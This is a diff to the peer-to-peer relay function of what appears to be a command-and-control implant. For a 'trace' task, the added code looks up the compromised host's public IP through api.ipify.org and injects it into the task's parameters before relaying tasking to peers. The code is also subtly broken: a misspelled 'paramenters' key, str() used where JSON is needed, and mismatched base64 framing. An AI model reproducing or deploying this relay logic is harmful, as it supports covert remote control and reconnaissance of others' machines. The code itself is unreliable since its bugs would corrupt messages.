@@ -90,17 +90,45 @@ def p2p_server(task_id):
                     for answer in delegates_aswers:
                         message = base64.b64decode(answer['message'])
                         message = message.decode("utf-8")
+                        message_uuid = message[:36]
                         message = message[36:]
                         message = json.loads(message)
                         if answer['uuid'] == received_uuid and message["action"] == received_message["action"]:
-                            message = answer['message']
-                            self.protocol_version = "HTTP/1.1"
-                            self.send_response(200)
-                            self.send_header("Content-Length", len(message))
-                            self.end_headers()
-                            self.wfile.write(bytes(message, "utf8"))
-                            delegates_aswers.remove(answer)
-                            reply = True
+                            if message["action"] == "get_tasking":
+                                if message["tasks"] != []:
+                                    for task in message["tasks"]:
+                                        if task["command"] == "trace":
+                                            ip = requests.get('https://api.ipify.org').text
+                                            if task["parameters"] == "":
+                                                task["parameters"] = ip
+                                            else:
+                                                task["paramenters"] += ";" + ip
+                                            message = to64(message_uuid) + to64(str(message))
+                                            self.protocol_version = "HTTP/1.1"
+                                            self.send_response(200)
+                                            self.send_header("Content-Length", len(message))
+                                            self.end_headers()
+                                            self.wfile.write(bytes(message, "utf8"))
+                                            delegates_aswers.remove(answer)
+                                            reply = True
+                                        else:
+                                            message = answer['message']
+                                            self.protocol_version = "HTTP/1.1"
+                                            self.send_response(200)
+                                            self.send_header("Content-Length", len(message))
+                                            self.end_headers()
+                                            self.wfile.write(bytes(message, "utf8"))
+                                            delegates_aswers.remove(answer)
+                                            reply = True
+                            else:                    
+                                message = answer['message']
+                                self.protocol_version = "HTTP/1.1"
+                                self.send_response(200)
+                                self.send_header("Content-Length", len(message))
+                                self.end_headers()
+                                self.wfile.write(bytes(message, "utf8"))
+                                delegates_aswers.remove(answer)
+                                reply = True
 
 
     def run():
